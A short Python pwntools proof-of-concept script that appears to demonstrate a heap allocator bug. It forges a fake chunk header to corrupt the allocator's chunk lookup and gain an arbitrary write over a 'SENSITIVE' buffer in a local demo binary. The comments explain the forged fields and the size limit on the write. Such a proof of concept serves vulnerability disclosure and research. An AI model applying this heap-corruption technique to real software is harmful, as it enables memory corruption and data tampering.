#!/usr/bin/env python

# applies to at least git has 2c80411

from pwn import *
import sys

v = process('./na_alloc_vuln_poc')
# fill prev chunk's data with junk, create fake header with junk prev_size,
# size of offset to our arb write addr, and allocated=true and is_last=true to
# mess up get_chunk_of_len
# will result in the value passed to malloc being written where we want...
# so silly
# oh did I mention that the value passed to malloc must be <= to the offset
# to your arb write? otherwise it thinks the heap's out of room and panics

# what this does is overwrite the chunk filled with "SENSITIVE" with a "D"
# (\x68\x00\x00\x00\x00\x00\x00) lol

buf = '\x43'*16 + '\x42'*8 + p64(68)+p8(1) + p8(1)
v.sendline(buf)
print v.recvall()
